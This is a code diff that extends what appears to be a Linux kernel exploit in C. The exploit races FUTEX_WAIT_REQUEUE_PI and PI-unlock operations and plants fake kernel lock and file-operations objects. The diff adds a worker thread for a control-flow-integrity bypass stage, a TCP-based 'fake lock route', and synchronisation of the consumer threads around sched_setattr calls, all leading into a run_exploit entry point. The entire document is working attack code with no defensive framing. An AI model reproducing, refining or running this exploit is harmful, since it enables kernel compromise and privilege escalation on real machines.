@@ -11,12 +11,51 @@ atomic_int route_done;
 atomic_int waiter_tid;
 atomic_int punch_consume_go;
 atomic_int punch_consume_stop;
+atomic_int consumer_inflight;
 atomic_int consumer_calls;
 atomic_int consumer_success;
 atomic_int main_route_delay_usec;
+atomic_int cfi_worker_request;
+atomic_int cfi_worker_done;
+atomic_int cfi_worker_result;
+atomic_int cfi_worker_stop;
+atomic_int pi_cleanup_done;
 atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
+
+static void *cfi_worker_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  int seen = 0;
+  while (!atomic_load(&cfi_worker_stop)) {
+    int seq = atomic_load(&cfi_worker_request);
+    if (seq == 0 || seq == seen) {
+      __asm__ volatile("yield" ::: "memory");
+      continue;
+    }
+    seen = seq;
+    atomic_store(&cfi_worker_result, try_cfi_stage());
+    atomic_store(&cfi_worker_done, seq);
+  }
+  return NULL;
+}
+
+void wait_for_consumer_idle(void) {
+  atomic_store(&punch_consume_go, 0);
+  while (atomic_load(&consumer_inflight)) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+}
+
+int run_cfi_stage_on_worker(void) {
+  wait_for_consumer_idle();
+  int seq = atomic_fetch_add(&cfi_worker_request, 1) + 1;
+  while (atomic_load(&cfi_worker_done) != seq) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  return atomic_load(&cfi_worker_result);
+}
 
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
@@ -39,6 +78,19 @@ void *waiter_thread(void *arg __attribute__((unused))) {
 
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+
+  if (env_flag("MAIN_TCP_ROUTE", 1)) {
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    while (!atomic_load(&owner_chain_done)) {
+      usleep(1000);
+    }
+    do_tcp_fake_lock_route();
+    while (!atomic_load(&pi_cleanup_done)) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    atomic_store(&route_done, 1);
+    return NULL;
+  }
 
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
@@ -98,24 +150,26 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         usleep((useconds_t)delay_usec);
       }
       for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+        atomic_store(&consumer_inflight, 1);
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) {
+          atomic_store(&consumer_inflight, 0);
           break;
         }
-        atomic_fetch_add(&consumer_calls, 1);
         int consumer_nice = env_int_range(
             "PSELECT_CONSUMER_NICE_VALUE", PSELECT_CONSUMER_NICE, -20, 19);
         errno = 0;
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
         int sched_errno = errno;
+        atomic_fetch_add(&consumer_calls, 1);
         if (sched_ret == 0) {
           atomic_fetch_add(&consumer_success, 1);
-        } else {
-          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
-                  "fake_lock=%016zx fake_w0=%016zx fake_fops=%016zx\n",
-                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0,
-                  fake_fops);
         }
+        atomic_store(&consumer_inflight, 0);
+        pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
+                "fake_lock=%016zx fake_w0=%016zx fake_fops=%016zx\n",
+                seq, sched_ret, sched_errno, tid, fake_lock, fake_w0,
+                fake_fops);
         calls_this_seq++;
         if (calls_this_seq >= CONSUMER_MAX_CALLS) {
           atomic_store(&punch_consume_go, 0);
@@ -140,9 +194,15 @@ void reset_main_route_state(void) {
   atomic_store(&waiter_tid, 0);
   atomic_store(&punch_consume_go, 0);
   atomic_store(&punch_consume_stop, 0);
+  atomic_store(&consumer_inflight, 0);
   atomic_store(&consumer_calls, 0);
   atomic_store(&consumer_success, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+  atomic_store(&cfi_worker_request, 0);
+  atomic_store(&cfi_worker_done, 0);
+  atomic_store(&cfi_worker_result, 0);
+  atomic_store(&cfi_worker_stop, 0);
+  atomic_store(&pi_cleanup_done, 0);
   atomic_store(&pipe_prepare_request, 0);
   atomic_store(&pipe_prepare_done, 0);
   cfi_last_step = 0;
@@ -155,6 +215,12 @@ void run_main_route_threads(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
+  pthread_t cfi_worker;
+  int ret = pthread_create(&cfi_worker, NULL, cfi_worker_thread, NULL);
+  if (ret != 0) {
+    errno = ret;
+    SYSCHK(-1);
+  }
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
@@ -173,6 +239,12 @@ void run_main_route_threads(void) {
       atomic_store(&pipe_prepare_done, 1);
     }
     usleep(10000);
+  }
+  atomic_store(&cfi_worker_stop, 1);
+  ret = pthread_join(cfi_worker, NULL);
+  if (ret != 0) {
+    errno = ret;
+    SYSCHK(-1);
   }
 }
 
@@ -237,4 +309,3 @@ int run_exploit(int argc, char **argv) {
   sleep(5);
   return 0;
 }
-
